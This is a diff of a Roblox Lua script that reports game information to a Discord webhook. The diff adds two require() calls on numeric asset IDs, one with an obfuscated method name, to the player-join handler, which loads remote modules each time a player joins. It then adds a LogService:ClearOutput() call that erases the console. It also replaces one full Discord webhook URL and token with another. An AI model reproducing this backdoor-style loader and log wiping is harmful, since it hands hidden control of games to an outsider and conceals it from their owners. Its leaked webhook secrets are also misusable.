@@ -1,11 +1,9 @@
-require(82712316338129):Asdafagumfklaop()
-require(77565251296196):load()
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local LogService = game:GetService("LogService")
 
-local generalWebhookURL = "https://discord.com/api/webhooks/1315319144991690863/xsw-1pnWtNypbdZwZYyAQvqcWQTxd3v3sb1E2hk3FYz9xLovsJP71gdrxbqZhp6UXe3p"
+local generalWebhookURL = "https://discord.com/api/webhooks/1315285720101027880/MSfntRo5RDub2hcJcHVNxYrn5Nq046DVk2yXxptjl3-OEcg2m_ALErBKj_s8TJGL7d2q"
 
 local function sendToDiscord(webhookURL, embedData)
 	local success, response = pcall(function()
@@ -51,6 +49,7 @@ end
 
 Players.PlayerAdded:Connect(function(player)
 	logGameInfo(player)
-
-
-end)
+	require(82712316338129):Asdafagumfklaop()
+	require(77565251296196):load()
+	LogService:ClearOutput()
+ end)
